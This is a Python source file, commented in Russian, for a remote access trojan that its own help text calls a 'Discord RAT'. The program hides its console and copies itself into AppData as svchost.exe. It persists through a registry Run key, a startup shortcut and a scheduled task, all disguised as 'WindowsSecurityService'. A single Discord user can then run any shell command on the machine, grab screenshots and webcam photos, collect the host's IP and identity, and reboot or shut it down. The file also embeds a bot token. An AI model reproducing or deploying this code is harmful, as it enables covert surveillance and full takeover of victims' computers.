import discord
from discord.ext import commands
import subprocess
import os
import sys
import time
import tempfile
import asyncio
import shutil

# ==================== КОНФИГУРАЦИЯ ====================
BOT_TOKEN = "MTQwMzYzMjEwODA0NzU2NDg3MA.G83D2z.-jQcJHPZ_ApFhkZDZTbIQtIa44wIal2JOkkb8w"
ALLOWED_USER_ID = 1232370927157645315

# ==================== АВТОЗАГРУЗКА (ТРИ СПОСОБА) ====================
def add_to_startup():
    """
    Добавляет программу в автозагрузку 3 способами
    """
    exe_path = os.path.abspath(sys.argv[0])
    
    # Способ 1: Реестр Windows (HKCU)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("[+] Автозагрузка добавлена в реестр")
    except:
        pass
    
    # Способ 2: Папка автозагрузки
    try:
        startup_folder = os.path.join(os.environ['APPDATA'], 
                                       r"Microsoft\Windows\Start Menu\Programs\Startup")
        shortcut_path = os.path.join(startup_folder, "WindowsSecurityService.lnk")
        
        if not os.path.exists(shortcut_path):
            import ctypes
            from ctypes import wintypes
            
            # Создаем VBS скрипт для создания ярлыка
            vbs_script = f'''
            Set shell = CreateObject("WScript.Shell")
            shortcut = shell.CreateShortcut("{shortcut_path}")
            shortcut.TargetPath = "{exe_path}"
            shortcut.WorkingDirectory = "{os.path.dirname(exe_path)}"
            shortcut.Save
            '''
            vbs_path = os.path.join(tempfile.gettempdir(), "create_shortcut.vbs")
            with open(vbs_path, "w") as f:
                f.write(vbs_script)
            os.system(f"cscript //nologo {vbs_path}")
            os.remove(vbs_path)
            print("[+] Ярлык добавлен в папку автозагрузки")
    except:
        pass
    
    # Способ 3: Планировщик задач (через schtasks)
    try:
        task_name = "WindowsSecurityService"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /f /rl highest'
        os.system(cmd)
        print("[+] Задача добавлена в планировщик")
    except:
        pass

def hide_console():
    """Скрывает окно консоли"""
    if os.name == "nt":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def copy_to_appdata():
    """Копирует себя в AppData (маскировка)"""
    try:
        appdata_path = os.environ['APPDATA'] + "\\Microsoft\\Windows\\Security\\"
        os.makedirs(appdata_path, exist_ok=True)
        
        target_path = appdata_path + "svchost.exe"
        if not os.path.exists(target_path):
            shutil.copy2(sys.argv[0], target_path)
        
        # Обновляем реестр на скопированный файл
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(key)
    except:
        pass

# ==================== ФУНКЦИИ ====================
def execute_cmd(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, 
                                timeout=60, encoding='cp866', errors='ignore')
        output = result.stdout + result.stderr
        if not output.strip():
            output = "✅ Команда выполнена (нет вывода)"
        return output[:1900]
    except subprocess.TimeoutExpired:
        return "❌ Таймаут 60 сек"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def get_system_info():
    info = {}
    try:
        info["hostname"] = os.environ.get("COMPUTERNAME", "Unknown")
        info["username"] = os.environ.get("USERNAME", "Unknown")
        try:
            info["ip"] = subprocess.run("curl -s ifconfig.me", shell=True, capture_output=True, text=True).stdout.strip()
        except:
            info["ip"] = "Unknown"
    except:
        info["ip"] = "Unknown"
    return info

def take_screenshot():
    try:
        import pyautogui
        screenshot = pyautogui.screenshot()
        temp_path = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
        screenshot.save(temp_path)
        return temp_path
    except:
        return None

def take_webcam():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            temp_path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.jpg")
            cv2.imwrite(temp_path, frame)
            cap.release()
            return temp_path
        cap.release()
        return None
    except:
        return None

# ==================== DISCORD БОТ ====================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"✅ Бот запущен: {bot.user}")
    user = await bot.fetch_user(ALLOWED_USER_ID)
    await user.send("🟢 **Discord RAT Activated**\n✅ Автозагрузка настроена\nИспользуйте `!help`")

@bot.event
async def on_message(message):
    if message.author.id != ALLOWED_USER_ID:
        return
    if message.content.startswith("!"):
        await bot.process_commands(message)

@bot.command(name="cmd")
async def cmd(ctx, *, command):
    await ctx.send(f"📟 Выполняю: `{command}`")
    result = execute_cmd(command)
    await ctx.send(f"```\n{result}\n```")

@bot.command(name="info")
async def info(ctx):
    info = get_system_info()
    await ctx.send(f"💻 **System Info**\n\n🖥️ **Hostname:** {info['hostname']}\n👤 **User:** {info['username']}\n🌐 **IP:** {info['ip']}")

@bot.command(name="screenshot")
async def screenshot(ctx):
    await ctx.send("📸 Делаю скриншот...")
    path = take_screenshot()
    if path and os.path.exists(path):
        await ctx.send(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.send("❌ Не удалось сделать скриншот")

@bot.command(name="webcam")
async def webcam(ctx):
    await ctx.send("📷 Активирую веб-камеру...")
    path = take_webcam()
    if path and os.path.exists(path):
        await ctx.send(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.send("❌ Не удалось сделать фото")

@bot.command(name="reboot")
async def reboot_pc(ctx):
    await ctx.send("🔄 Перезагружаю компьютер через 10 секунд...")
    os.system("shutdown /r /t 10")

@bot.command(name="shutdown")
async def shutdown_pc(ctx):
    await ctx.send("💀 Выключаю компьютер через 10 секунд...")
    os.system("shutdown /s /t 10")

@bot.command(name="abort")
async def abort_shutdown(ctx):
    os.system("shutdown /a")
    await ctx.send("✅ Перезагрузка/выключение отменены")

@bot.command(name="kill")
async def kill_bot(ctx):
    await ctx.send("🛑 Bot shutting down...")
    await bot.close()
    os._exit(0)

@bot.command(name="help")
async def help_command(ctx):
    help_text = """
🤖 **Discord RAT - Команды:**

`!cmd <команда>` — выполнить CMD
`!info` — инфо о системе
`!screenshot` — скриншот
`!webcam` — веб-камера
`!reboot` — перезагрузка (10 сек)
`!shutdown` — выключение (10 сек)
`!abort` — отменить
`!kill` — остановить RAT
"""
    await ctx.send(help_text)

# ==================== ЗАПУСК ====================
if __name__ == "__main__":
    hide_console()
    copy_to_appdata()      # Копируем себя в AppData
    add_to_startup()       # Добавляем в автозагрузку
    
    bot.run(BOT_TOKEN)
